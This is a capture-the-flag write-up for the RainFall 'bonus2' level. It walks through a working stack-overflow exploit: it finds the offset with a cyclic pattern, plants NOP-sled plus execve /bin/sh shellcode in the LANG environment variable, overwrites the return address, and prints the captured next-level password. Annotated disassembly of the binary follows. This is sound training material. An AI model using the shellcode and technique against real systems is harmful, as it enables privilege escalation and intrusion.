# SOLUTION
Note: I put the shellcode in the environment, in the LANG variable. The address was the address of the LANG pointer with getenv.

./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 18 + '\xab\xfe\xff\xbf'")
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587



bonus2@RainFall:~$ ./bonus2 
bonus2@RainFall:~$ ./bonus2 hello
bonus2@RainFall:~$ ./bonus2 hello you
Hello hello
bonus2@RainFall:~$ ./bonus2 hello you bonjour
bonus2@RainFall:~$ ./bonus2 hello bonjour
Hello hello
bonus2@RainFall:~$ ./bonus2 bon jour
Hello bon

The program seems to take 2 args, concatenate Hello with argv[1].


-----------

Find overflow offset of strcpy:
--> with LANG="en"
(gdb) run $(python -c "print '\x90' * 40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/bonus2/bonus2 0123456789012345678901234567890123456789 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5A
Hello 0123456789012345678901234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? ()
--> no offset found

--> with LANG="fi"
(gdb) run $(python -c "print '\x90' * 40") Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/bonus2/bonus2 0123456789012345678901234567890123456789 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Hyvää päivää 0123456789012345678901234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? () --> offset is at 18

-> We can use LANG="fi" to overflow strcpy:

export LANG=`python -c "print('fi' + '\x90' * 100 + '\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh')"`

x/s *((char **)environ+11) (to find the LANG address)
0xbffffe9b:	 "LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\353\037^\211v\b1\300\210F\a\211F\f\260\v\211\363\215N\b\215V\f\315\200\061\333\211\330@\315\200\350\334\377\377\377/bin/sh"

Take an address with a NOP, so that it will slide into the shellcode
(gdb) x/16wx 0xbffffe9b
0xbffffe9b:	0x474e414c	0x9069663d	0x90909090	0x90909090
-> 0xbffffeab:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffebb:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffffecb:	0x90909090	0x90909090	0x90909090	0x90909090

bonus2@RainFall:~$ ./bonus2 $(python -c "print '\x90' * 40") $(python -c "print '\x90' * 18 + '\xab\xfe\xff\xbf'")
Hyvää päivää ��������������������������������������������������������������
$ pwd
/home/user/bonus2
$ whoami
bonus3
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587

-----------

info var
0x08049988  language

```
(gdb) disas main
Dump of assembler code for function main:
   0x08048529 <+0>:		push   %ebp
   0x0804852a <+1>:		mov    %esp,%ebp
   0x0804852c <+3>:		push   %edi
   0x0804852d <+4>:		push   %esi
   0x0804852e <+5>:		push   %ebx
   0x0804852f <+6>:		and    $0xfffffff0,%esp
   0x08048532 <+9>:		sub    $0xa0,%esp					   	; allocate 160 bytes for variables
   0x08048538 <+15>:	   cmpl   $0x3,0x8(%ebp)					; compares 3 to ebp+8 (argc?)
   0x0804853c <+19>:	   je     0x8048548 <main+31>				; if equal to 3, jump to 31
   0x0804853e <+21>:	   mov    $0x1,%eax							; set eax to 1
   0x08048543 <+26>:	   jmp    0x8048630 <main+263>			; jump to 263
   0x08048548 <+31>:	   lea    0x50(%esp),%ebx					; move pointer in esp+80 to ebx (buffer ?)
   0x0804854c <+35>:	   mov    $0x0,%eax							; set eax to 0
   0x08048551 <+40>:	   mov    $0x13,%edx							; set edx to 19
   0x08048556 <+45>:	   mov    %ebx,%edi							; move esp+80 to edi
   0x08048558 <+47>:	   mov    %edx,%ecx							; move 19 to ecx
   0x0804855a <+49>:	   rep stos %eax,%es:(%edi)				; for ecx repetitions (19) stores the contents of eax (0) into where edi points to, incrementing or decrementing edi (depending on the direction flag) by 4 bytes each time   ----> that means memset(0xbffff690,76)
   0x0804855c <+51>:	   mov    0xc(%ebp),%eax					; move ebp+12(**argv) to eax
   0x0804855f <+54>:	   add    $0x4,%eax							; eax = eax+4 = ebp+16 (argv[1]?)
   0x08048562 <+57>:	   mov    (%eax),%eax                  ; eax = *eax
   0x08048564 <+59>:	   movl   $0x28,0x8(%esp)					; move 40 to esp+8 (size)
   0x0804856c <+67>:	   mov    %eax,0x4(%esp)					; move ebp+16 (argv[1]) to esp+4 (src)
   0x08048570 <+71>:	   lea    0x50(%esp),%eax					; move pointer in esp+80 to eax
   0x08048574 <+75>:	   mov    %eax,(%esp)						; move eax (esp+80) to esp (dest)
   0x08048577 <+78>:	   call   0x80483c0 <strncpy@plt>		; strncpy(buffer, argv[1], 40)
   0x0804857c <+83>:	   mov    0xc(%ebp),%eax					; move ebp+12 to eax
   0x0804857f <+86>:	   add    $0x8,%eax							; eax = eax+8 = ebp+20 (argv[2]?)
   0x08048582 <+89>:	   mov    (%eax),%eax                  ; dereference eax
   0x08048584 <+91>:	   movl   $0x20,0x8(%esp)					; move 32 to esp+8
   0x0804858c <+99>:	   mov    %eax,0x4(%esp)					; move eax (argv[2]) to esp+4
   0x08048590 <+103>:	lea    0x50(%esp),%eax					; move pointer in esp+80 to eax (buffer)
   0x08048594 <+107>:	add    $0x28,%eax							; add 40 to eax | esp+120 | buffer[40]
   0x08048597 <+110>:	mov    %eax,(%esp)						; move esp+120 to esp
   0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>		; strncpy(buffer[40], argv[2], 32)
   0x0804859f <+118>:	movl   $0x8048738,(%esp)				; x/s: "LANG"
   0x080485a6 <+125>:	call   0x8048380 <getenv@plt>			; getenv("LANG")
   0x080485ab <+130>:	mov    %eax,0x9c(%esp)					; store return value of getenv (pointer to the value in env) in esp+156, stored in a char*
   0x080485b2 <+137>:	cmpl   $0x0,0x9c(%esp)					; compare 0 esp+156
   0x080485ba <+145>:	je     0x8048618 <main+239>			; if equal to 0, jump to 239
   0x080485bc <+147>:	movl   $0x2,0x8(%esp)					; set esp+8 to 2
   0x080485c4 <+155>:	movl   $0x804873d,0x4(%esp)			; x/s: "fi" to esp+4
   0x080485cc <+163>:	mov    0x9c(%esp),%eax					; move esp+156 to eax
   0x080485d3 <+170>:	mov    %eax,(%esp)						; move esp+156 to esp, return value of getenv
   0x080485d6 <+173>:	call   0x8048360 <memcmp@plt>			; memcmp(*(esp+156), "fi", 2)
   0x080485db <+178>:	test   %eax,%eax							; compare return of memcmp
   0x080485dd <+180>:	jne    0x80485eb <main+194>         ; jump to main+194 if return is not zero
   0x080485df <+182>:	movl   $0x1,0x8049988               ; variable "language" set to 1
   0x080485e9 <+192>:	jmp    0x8048618 <main+239>         ; jump to 239
   0x080485eb <+194>:	movl   $0x2,0x8(%esp)               ; esp + 8 = 2
   0x080485f3 <+202>:	movl   $0x8048740,0x4(%esp)         ; esp + 4 = "nl"
   0x080485fb <+210>:	mov    0x9c(%esp),%eax              ; eax = esp + 156 (return of getenv)
   0x08048602 <+217>:	mov    %eax,(%esp)                  ; esp = eax
   0x08048605 <+220>:	call   0x8048360 <memcmp@plt>       ; memcmp(*esp + 156, 'nl', 2);
   0x0804860a <+225>:	test   %eax,%eax                    ; compare return of memcmp
   0x0804860c <+227>:	jne    0x8048618 <main+239>         ; if not zero jump to 239
   0x0804860e <+229>:	movl   $0x2,0x8049988               ; set variable "language" to 2
   0x08048618 <+239>:	mov    %esp,%edx                    ; edx = esp (return of getenv) (TO VERIFY)
   0x0804861a <+241>:	lea    0x50(%esp),%ebx              ; ebx = esp + 80
   0x0804861e <+245>:	mov    $0x13,%eax                   ; eax = 19
   0x08048623 <+250>:	mov    %edx,%edi                    ; edi = edx
   0x08048625 <+252>:	mov    %ebx,%esi                    ; esi = ebx
   0x08048627 <+254>:	mov    %eax,%ecx                    ; ecx = eax
   0x08048629 <+256>:	rep movsl %ds:(%esi),%es:(%edi)     ; repeat 19 times move 4bytes from esp + 80 to edx (return of getenv)
   0x0804862b <+258>:	call   0x8048484 <greetuser>        ; greetuser()
   0x08048630 <+263>:	lea    -0xc(%ebp),%esp
   0x08048633 <+266>:	pop    %ebx
   0x08048634 <+267>:	pop    %esi
   0x08048635 <+268>:	pop    %edi
   0x08048636 <+269>:	pop    %ebp
   0x08048637 <+270>:	ret    
End of assembler dump.
```

```
(gdb) disas greetuser 
Dump of assembler code for function greetuser:
   0x08048484 <+0>:	push   %ebp
   0x08048485 <+1>:	mov    %esp,%ebp                 ; ebp = esp --> esp + 88
   0x08048487 <+3>:	sub    $0x58,%esp                ; esp = esp - 88
   0x0804848a <+6>:	mov    0x8049988,%eax            ; eax = $language
   0x0804848f <+11>:	cmp    $0x1,%eax                 ; compare $language == 1
   0x08048492 <+14>:	je     0x80484ba <greetuser+54>  ; if language == 1, jump to +54
   0x08048494 <+16>:	cmp    $0x2,%eax                 ; compare language to 2
   0x08048497 <+19>:	je     0x80484e9 <greetuser+101> ; if language == 2, jump to +101
   0x08048499 <+21>:	test   %eax,%eax                 ; test eax
   0x0804849b <+23>:	jne    0x804850a <greetuser+134> ; if language != 0, jump to +134
   0x0804849d <+25>:	mov    $0x8048710,%edx           ; edx = &"Hello "
   0x080484a2 <+30>:	lea    -0x48(%ebp),%eax          ; eax = ebp - 72 (== esp + 16) --> buf[72] ?
   0x080484a5 <+33>:	mov    (%edx),%ecx               ; ecx = *edx
   0x080484a7 <+35>:	mov    %ecx,(%eax)               ; eax = ecx (= "Hello ")
   0x080484a9 <+37>:	movzwl 0x4(%edx),%ecx            ; move 16 last bytes of edx + 4 to ecx
   0x080484ad <+41>:	mov    %cx,0x4(%eax)             ; eax + 4 (== ecx + 4) to cx
   0x080484b1 <+45>:	movzbl 0x6(%edx),%edx            ; move 8 last bytes of edx + 6 to edx
   0x080484b5 <+49>:	mov    %dl,0x6(%eax)             ; move dl (8 bytes) to eax + 6
   0x080484b8 <+52>:	jmp    0x804850a <greetuser+134> ; jump to +134
   0x080484ba <+54>:	mov    $0x8048717,%edx           ; edx = hello in finnish "Hyvää päivää "
   0x080484bf <+59>:	lea    -0x48(%ebp),%eax          ;  
   0x080484c2 <+62>:	mov    (%edx),%ecx               ; move "Hyvää päivää " to ecx
   0x080484c4 <+64>:	mov    %ecx,(%eax)               ; move "Hyvää päivää " to eax
   0x080484c6 <+66>:	mov    0x4(%edx),%ecx            ; move edx+4 to ecx
   0x080484c9 <+69>:	mov    %ecx,0x4(%eax)            ; move edx+4 to eax+4
   0x080484cc <+72>:	mov    0x8(%edx),%ecx            ; move edx+8 to ecx
   0x080484cf <+75>:	mov    %ecx,0x8(%eax)            ; move edx+8 to eax+8
   0x080484d2 <+78>:	mov    0xc(%edx),%ecx            ; move edx+12 to ecx
   0x080484d5 <+81>:	mov    %ecx,0xc(%eax)            ; move edx+12 to eax+12
   0x080484d8 <+84>:	movzwl 0x10(%edx),%ecx           ; move edx+16 to ecx
   0x080484dc <+88>:	mov    %cx,0x10(%eax)            ; move cx to eax+16 (cx = loop count register)
   0x080484e0 <+92>:	movzbl 0x12(%edx),%edx           ; move edx+18 to edx
   0x080484e4 <+96>:	mov    %dl,0x12(%eax)            ; move %dl to eax+18 (dl= least significant byte of edx)
   0x080484e7 <+99>:	jmp    0x804850a <greetuser+134> ;
   0x080484e9 <+101>:	mov    $0x804872a,%edx        ; edx = hello in dutch = "Goedemiddag! "
   0x080484ee <+106>:	lea    -0x48(%ebp),%eax       ;
   0x080484f1 <+109>:	mov    (%edx),%ecx            ; move "Goedemiddag! " to ecx
   0x080484f3 <+111>:	mov    %ecx,(%eax)            ; move "Goedemiddag! " to eax
   0x080484f5 <+113>:	mov    0x4(%edx),%ecx         ; move edx+4 to ecx
   0x080484f8 <+116>:	mov    %ecx,0x4(%eax)         ; move edx+4 to eax+4
   0x080484fb <+119>:	mov    0x8(%edx),%ecx         ; move edx+8 to ecx
   0x080484fe <+122>:	mov    %ecx,0x8(%eax)         ; move edx+8 to eax+8
   0x08048501 <+125>:	movzwl 0xc(%edx),%edx         ; move edx+12 to edx
   0x08048505 <+129>:	mov    %dx,0xc(%eax)          ; move dx to eax+12 (dx = data register)
   0x08048509 <+133>:	nop                           ;
   0x0804850a <+134>:	lea    0x8(%ebp),%eax         ; eax = ebp + 8 (argv[1]?)
   0x0804850d <+137>:	mov    %eax,0x4(%esp)         ; esp + 4 = eax
   0x08048511 <+141>:	lea    -0x48(%ebp),%eax       ; eax = ebp - 72 (apparently esp + 24?)
   0x08048514 <+144>:	mov    %eax,(%esp)            ; esp = eax
   0x08048517 <+147>:	call   0x8048370 <strcat@plt> ; strcat(esp + 16, ebp + 8)
   0x0804851c <+152>:	lea    -0x48(%ebp),%eax       ;
   0x0804851f <+155>:	mov    %eax,(%esp)            ;
   0x08048522 <+158>:	call   0x8048390 <puts@plt>   ;
   0x08048527 <+163>:	leave          
   0x08048528 <+164>:	ret    
End of assembler dump.
```

# Notes
If argv[1] is 40, it connects with argv[2]. if argv[2] is 26 characters long, it adds with the ending 0 of strcat and corrupts address at esp + 88. Changing it to the address of a shellcode seems to work. You can change too up to the return address of the function at esp 92, 2 last bytes (but it also adds a 00 to the third byte, corrupting it... unless we find an address 0x0800****)